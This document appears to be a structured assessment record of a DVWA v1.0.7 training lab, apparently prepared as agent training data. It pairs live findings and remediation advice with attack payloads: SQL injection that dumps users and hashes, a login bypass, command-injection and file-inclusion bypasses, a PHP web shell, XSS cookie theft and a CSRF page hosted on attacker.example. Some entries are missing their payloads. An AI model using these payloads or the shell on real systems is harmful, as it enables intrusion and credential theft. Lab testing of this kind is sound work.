meta.assessment_type: Authorized lab assessment (user-owned DVWA training instance) for expert-agent training data

application.name: Damn Vulnerable Web Application (DVWA)
application.version_evidence: live_verified: page title 'Damn Vulnerable Web App (DVWA) v1.0.7 :: Setup'

infrastructure.evidence: live_verified: setup.php reports 'Could not connect to the database'

infrastructure.detail: reverse-proxied (X-Forwarded-For / X-Real-IP env present in phpinfo)

authentication.verification: documented_dvwa_default: could NOT be live-verified because MySQL was down during assessment (login is DB-backed)
authentication.auth_gating: all module pages 302-redirect to login.php without a valid session (live_verified)

constraints: MySQL backend was down for the entire assessment: login and all DB-backed modules (brute, csrf, sqli, sqli_blind, xss_s, upload-form) could not be live-exploited.
Module endpoints were live-confirmed to exist via the DVWA menu HTML rendered on setup.php before authentication.

Module payload entries below are DOCUMENTED behavior for DVWA v1.0.7 (deterministic lab application); payload entries are labeled evidence='documented_dvwa_1.0.7' and must be re-verified live once MySQL is restored (see reverification_checklist).
Live-verified findings are labeled evidence='live_verified' and carry the HTTP proof observed on 2026-10-13.

evidence_legend.live_verified: observed directly on the target during this assessment
evidence_legend.live_corroborated: attack outcome confirmed indirectly by artifacts found on the target
evidence_legend.documented_dvwa_1.0.7: deterministic documented behavior of DVWA v1.0.7 at the given security level; re-verify after DB restore

live_verified_findings.title: Arbitrary PHP execution in web-accessible uploads directory (upload module impact CONFIRMED)
live_verified_findings.detail: 17+ PHP files already uploaded by prior activity (MARIJUANA.php, dvwa-shell.php, pwn.php, r.php, s.php, shell.php, shell42.php, simple.php, recon.php, info2.php, gas.php.jpg, rr.php) sit in the webroot uploads dir. Fetching /dvwa/hackable/uploads/info2.php returned HTTP 200 with a 49KB phpinfo() dump (PHP 5.2.4-2ubuntu5.10), proving uploaded PHP code executes server-side.
live_verified_findings.expected_success_signal: HTTP 200 from an uploaded .php file returning its code output (phpinfo table)
live_verified_findings.impact: Full server compromise: command execution, credential theft, pivot to DB
live_verified_findings.remediation: Block .php execution in upload dirs (nginx: location ~* /uploads/.*\.php$ { deny all; }), validate extension+MIME+content server-side, randomize stored filenames, store outside webroot
live_verified_findings.reasoning: Execution proven directly: GET of an uploaded .php artifact returned a full phpinfo() page, which is only possible if the server parsed the file as PHP.

live_verified_findings.title: Directory listing enabled on uploads, config and includes directories
live_verified_findings.detail: nginx autoindex serves browsable listings ('Index of') for /dvwa/hackable/uploads/ (full file inventory incl. all shells), /dvwa/config/ (reveals config.inc.php filename) and /dvwa/dvwa/ (includes dir).
live_verified_findings.expected_success_signal: 200 response containing 'Index of' and href list of files
live_verified_findings.impact: Reveals attack surface: uploaded shell inventory, config file names, internal structure; helps an attacker identify prior shells to reuse
live_verified_findings.remediation: autoindex off; drop empty-location index or return 403
live_verified_findings.reasoning: Listings fetched directly during assessment; file names enumerated from response HTML.

live_verified_findings.title: Full phpinfo() exposed via uploaded file (and phpinfo.php present, auth-gated)
live_verified_findings.detail: 49KB phpinfo dump discloses PHP 5.2.4 paths, modules, environment (incl. proxy headers), disabled functions context, upload/URL-include settings. /dvwa/phpinfo.php also exists but redirects to login.
live_verified_findings.impact: Aids LFI target selection, reveals misconfigurations and internal env
live_verified_findings.remediation: Delete artifact; never expose phpinfo in production paths
live_verified_findings.reasoning: Response contained the phpinfo() page title and PHP version banner.

live_verified_findings.title: Session cookie without HttpOnly / Secure / SameSite attributes
live_verified_findings.detail: Set-Cookie: PHPSESSID=<id>; path=/ — no HttpOnly, no Secure, no SameSite. Also security cookie: security=high without flags.
live_verified_findings.impact: Session hijacking via XSS (document.cookie readable), cookie theft over plain HTTP, CSRF-adjacent issues
live_verified_findings.reasoning: Raw Set-Cookie headers captured from live responses contain no security attributes.

live_verified_findings.title: MySQL backend unreachable (database down / wrong credentials)
live_verified_findings.detail: Every page load dies with 'Unable to connect to the database.'; POST create_db returns 'Could not connect to the database - please check the config file.' Persistent across the whole assessment window (7+ probes over several minutes).
live_verified_findings.expected_success_signal: login.php body contains 'Unable to connect to the database'
live_verified_findings.impact: Lab unusable for DB-backed vuln training until fixed; also an availability fingerprint
live_verified_findings.remediation: Start the MySQL service/container on server.vulnapp.id and verify credentials in /dvwa/config/config.inc.php, then click Create / Reset Database
live_verified_findings.reasoning: Error reproduced consistently on every request during the assessment window.

live_verified_findings.title: Software version banners disclosed
live_verified_findings.detail: Server: nginx/1.24.0 (Ubuntu); X-Powered-By: PHP/5.2.4-2ubuntu5.10; DVWA v1.0.7 in page titles. PHP 5.2.4 reached EOL in Jan 2011 and carries hundreds of known CVEs.
live_verified_findings.impact: Precise CVE mapping for exploit selection
live_verified_findings.reasoning: Headers and titles captured verbatim from live responses.

live_verified_findings.title: robots.txt discloses application path
live_verified_findings.detail: Contains 'User-agent: * Disallow: /' — confirms hidden root to crawlers/attackers.
live_verified_findings.remediation: n/a for a lab; in general do not rely on robots.txt for hiding

live_verified_findings.title: Negative findings worth training on (things that do NOT work here)
live_verified_findings.detail: config.inc.php is executed (empty body) not served as source: no source disclosure. /.git/HEAD: 404: no repo leak. phpinfo shows allow_url_include=Off: RFI payloads via ?page=http://... will fail even at low security — agents should pivot to LFI/null-byte instead.
live_verified_findings.expected_success_signal: 200-empty for .php config fetch; 404 for .git; RFI include fails silently/blank
live_verified_findings.impact: Prevents expert agents from wasting exploit budget on dead paths
live_verified_findings.reasoning: All three probes executed live with the stated outcomes.

live_verified_findings.title: Shared-lab artifacts: prior shells and upload-bypass experiments
live_verified_findings.detail: Besides plain shells, the dir contains null-byte and CRLF upload-bypass test artifacts (bbtool-test-*.php%2500.jpg, bbtool-test-*.php%250d%250a.jpg, *.php.jpg) — evidence that extension-truncation bypasses were exercised against the upload module on this instance.
live_verified_findings.expected_success_signal: Files with encoded .php%2500.jpg / .php.jpg names present in listing
live_verified_findings.impact: Documents which bypass techniques already succeed on this lab
live_verified_findings.remediation: Purge uploads dir before using this instance for clean training runs
live_verified_findings.reasoning: Names enumerated from the live directory listing.

params.id: user id, string reaches SQL unfiltered at low

findings.expected_success_signal: Raw MySQL error in response: "You have an error in your SQL syntax... near ''' at line 1"
findings.reasoning: Query is 'SELECT first_name, last_name FROM users WHERE user_id = '$id'' with no escaping; a lone quote breaks the literal and leaks the MySQL syntax error, confirming injection and fingerprinting the DBMS in one step.

findings.payload: ' UNION SELECT user, password FROM users#
findings.expected_success_signal: Response lists all users with md5 password hashes, e.g. admin / 5f4dcc3b5aa765d61d8327deb882cf99 (md5 of 'password')
findings.reasoning: UNION with matching column count (2) appends the credentials table to the result render; '#' comments out the trailing quote. Known DB content makes the success signal deterministic.

findings.expected_success_signal: All users listed (tautology makes WHERE true for every row)
findings.reasoning: Tautology-based extraction requires no comment character, so it survives even where '#' is stripped; boolean tautology is the natural fallback probe after the quote error confirms injection.

findings.expected_success_signal: If medium wraps $id in quotes after mysql_real_escape_string, quote-based payloads fail and this integer-style payload also fails (treated as string); verify live. If numeric-unquoted context: all users returned
findings.reasoning: Medium applies mysql_real_escape_string, which neutralizes quote breakout in string context. The 1.0.7 medium source is ambiguous in the field (quoted vs unquoted) — this entry deliberately models an uncertain-evidence decision for the expert agent, to be resolved by live probing after DB restore.

findings.expected_success_signal: True-probe returns 'User ID exists in the database.'; false-probe returns 'User ID is MISSING from the database.' No error text (that is what makes it blind)
findings.reasoning: Response differentials are the only oracle: constructing a true/false pair with identical structure isolates the boolean without relying on error output, which this page never emits.

findings.expected_success_signal: Response time delayed ~5s while page content stays identical
findings.reasoning: When content oracles are unavailable (or to automate extraction), a conditional time delay converts any boolean into a measurable channel; MySQL SLEEP() is the canonical delay primitive.

findings.expected_success_signal: ~5s delay (medium escapes quotes but the numeric context needs none)
findings.reasoning: Escaping only defends quote breakout; in the blind module the injected value is used unquoted, so integer-context payloads that never use a quote bypass the escaping entirely.

params.ip: host/IP to ping — concatenated into shell_exec('ping -c 3 ' . $ip)

findings.expected_success_signal: ping output in <pre> followed by /etc/passwd contents (root:x:0:1:...)
findings.reasoning: Low level does no filtering at all and the input is appended to a shell_exec ping call, so a semicolon terminates the ping and appends an arbitrary command whose stdout is rendered.

findings.expected_success_signal: ping output followed by uid=www-data gid=www-data
findings.reasoning: && runs the second command only if ping succeeds, keeping output clean; id is the canonical privilege oracle for confirming code execution context.

findings.expected_success_signal: passwd contents appear even though '&&' and ';' are blacklisted
findings.reasoning: Medium blacklists only '&&' and ';'. A single '&' still separates shell commands (backgrounding ping), and '|' pipes into the next command — both unfiltered metacharacters restore execution.

findings.expected_success_signal: passwd contents; note high allows '|' by design but blocks '&' ';' '&& '
findings.reasoning: High's blacklist still omits the pipe operator, so output-redirection chaining survives; flagged lower confidence because blacklist membership varies slightly across DVWA builds — confirm live.

params.page: passed verbatim to include() at low

findings.expected_success_signal: etc/passwd contents rendered. On this target PHP is 5.2.4 (< 5.3.4) so the %00 null-byte truncates any '.php' suffix appended by include()
findings.evidence: documented_dvwa_1.0.7 (null-byte applicability live_corroborated by PHP version banner)
findings.reasoning: include($_GET['page']) with traversal prefixes escapes the dvwa/vulnerabilities/fi/ base dir; the ancient PHP version makes the null-byte suffix-truncation variant viable, which is otherwise dead on modern PHP.

findings.expected_success_signal: EXPECTED FAILURE on this instance: phpinfo (live) shows allow_url_include=Off, so remote URLs are not included. Use as negative training data
findings.reasoning: RFI viability is decided by php.ini, not the app: the uploaded phpinfo() artifact proves URL inclusion is disabled here, so an expert agent should route effort to LFI/null-byte instead of burning attempts on RFI.

findings.expected_success_signal: passwd contents; naive ../ payloads return blank because the filter strips them once
findings.reasoning: Medium uses naive str_replace blacklists ('../', 'http://', 'https://', '..\'). Filters that replace once are beaten by embedding the token inside itself: stripping the inner copy re-forms the outer one.

findings.expected_success_signal: Success message, then GET /dvwa/hackable/uploads/shell.php?c=id returns 'PWN' + uid=www-data. OUTCOME ALREADY live_corroborated: 17+ PHP shells present in that dir and info2.php executed phpinfo() during this assessment
findings.reasoning: Low level moves the file with its original name and no validation, and the uploads dir is inside the webroot with PHP enabled — the exact chain already exercised by prior files on this server, including .php%00.jpg and CRLF-extension artifacts.

findings.payload: shell.php whose body starts with 'GIF89a;' followed by <?php system($_GET['c']); ?>
findings.expected_success_signal: getimagesize() reads the GIF magic header and validates the file as an image; the .php extension is never checked, so the file still lands as shell.php and executes
findings.reasoning: Medium validates only the file's image-ness (getimagesize) while preserving the attacker-controlled filename — magic-byte prefixing satisfies content inspection while the extension keeps the file executable.

findings.expected_success_signal: Script tag rendered verbatim in the response HTML (no encoding)
findings.reasoning: The parameter is printed with no encoding, so an inline script executes on load; on this target the session cookie also lacks HttpOnly (live finding LIVE-004), making document.cookie exfiltration the natural impact demo.

findings.expected_success_signal: After the filter strips the inner '<script>' the outer fragments re-form a working <script> tag; or the img event handler fires
findings.reasoning: Medium removes the literal '<script>' once — nesting the token inside itself survives the single-pass strip; event-handler payloads avoid the blacklisted tag entirely.

findings.expected_success_signal: Payload persists in the guestbook and executes for EVERY visitor viewing the page (stored, not just reflected)
findings.reasoning: The message is stored unescaped in the DB and re-rendered for all sessions, converting a reflected nuisance into persistent session theft; combined with the missing HttpOnly flag this yields direct PHPSESSID harvesting.

findings.payload: <scr<script>ipt>alert(1)</scr</script>ipt> in mtxMessage (name field is htmlspecialchars'd — not injectable)
findings.expected_success_signal: Nested tag re-forms after single-pass strip_tags-style filtering; encoded name field stays inert
findings.reasoning: Medium hardens the name field properly but only strip-filters the message; the nested-token bypass defeats single-pass stripping, and knowing WHICH param is hardened (name) vs not (message) is exactly the differential an expert agent must exploit.

params.username: username, string-concatenated into login SQL at low

findings.expected_success_signal: 'Welcome to the password protected area' as admin — the # comments out the password check
findings.reasoning: SELECT * FROM users WHERE user='$user' AND password=md5('$pass'): a quote plus comment in the username field terminates the string and hides the AND clause, so authentication succeeds without knowing the password. Must URL-encode # as %23.

findings.expected_success_signal: Unlimited attempts, no lockout/CAPTCHA/delay; known default admin:password returns the welcome page
findings.reasoning: No rate limiting of any kind exists at low, so credential stuffing is limited only by bandwidth; the DVWA default admin/password makes the success signal deterministic for training.

findings.payload: same wordlist strategy (SQLi bypass is closed by mysql_real_escape_string)
findings.expected_success_signal: Attempts still never lock out, but each failure sleeps ~2s (sleep(2) on fail) — brute force remains feasible, just slower
findings.reasoning: Medium adds escaping and an artificial delay on failure but no lockout: the delay raises per-attempt cost linearly without a ceiling, so persistent wordlist attacks still terminate successfully — a key lesson that slowing ≠ stopping.

findings.payload: on any page the victim views while logged in
findings.expected_success_signal: Victim's password changed to 'pwned' (page shows 'Password Changed.' when hit directly); attacker then logs in with known creds
findings.reasoning: A state-changing GET with no token, no re-authentication and no origin check is forgeable from any external context; cookies ride along automatically, and knowing the new password converts the attack into account takeover.

findings.payload: Host the CSRF img page under a path containing the host string, e.g. https://attacker.example/server.vulnapp.id/poc.html (bypasses stristr($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME']))
findings.expected_success_signal: Password change succeeds when the Referer merely CONTAINS the server name substring
findings.reasoning: The medium check tests substring containment of the host in the Referer, not equality: an attacker-controlled directory named after the target host satisfies the predicate, a classic containment-check bypass.

findings.payload: Chain stored XSS (xss_s) to read the anti-CSRF user_token from the page DOM and submit the forged request with a valid token
findings.expected_success_signal: Token-bearing forged request accepted; direct forged requests fail with token mismatch
findings.reasoning: High requires a per-session token, which defeats naive forgery; but the token is readable from the victim's DOM, so the documented bypass is composing the stored-XSS primitive with the CSRF request — the textbook reason XSS and CSRF must be threat-modeled together.

cross_module_chains.status: live_corroborated: prior shells present and info2.php executed phpinfo() during assessment

cross_module_chains.steps: sqli low UNION dump -> crack md5 (admin: 5f4dcc3b5aa765d61d8327deb882cf99 = 'password') -> login
xss_s payload reads document.cookie (no HttpOnly: LIVE-004) and page user_token -> forge CSRF password change
cross_module_chains.status: cookie-flag half live_verified, token chain documented

cross_module_chains.steps: fi ?page=../../../../config/config.inc.php%00 executes config (no output) — read other files (/etc/passwd) or target logs; PHP 5.2.4 makes %00 truncation viable

cross_module_chains.chain: brute-force SQLi bypass -> admin session -> all modules
cross_module_chains.steps: brute low admin%23 -> authenticated access to every module at chosen security level

reverification_checklist: 1. Restore MySQL on server.vulnapp.id (start service/container; check credentials in /dvwa/config/config.inc.php).
2. POST /dvwa/setup.php with create_db=Create / Reset Database until it reports success (not 'Could not connect').
4. Set level low: POST /dvwa/security.php security=low&seclev_submit=Submit (or set cookie security=low).
5. Re-run every 'documented_dvwa_1.0.7' payload above at low, then medium, and flip each entry's evidence field to live_verified once its expected_success_signal matches.
6. Purge /dvwa/hackable/uploads/ of prior shells (MARIJUANA.php, pwn.php, ...) before clean training runs — they are live RCE backdoors.
7. Re-check that the DB-backed negative entries (SQLI-MED ambiguity) are resolved by observation, not assumption.
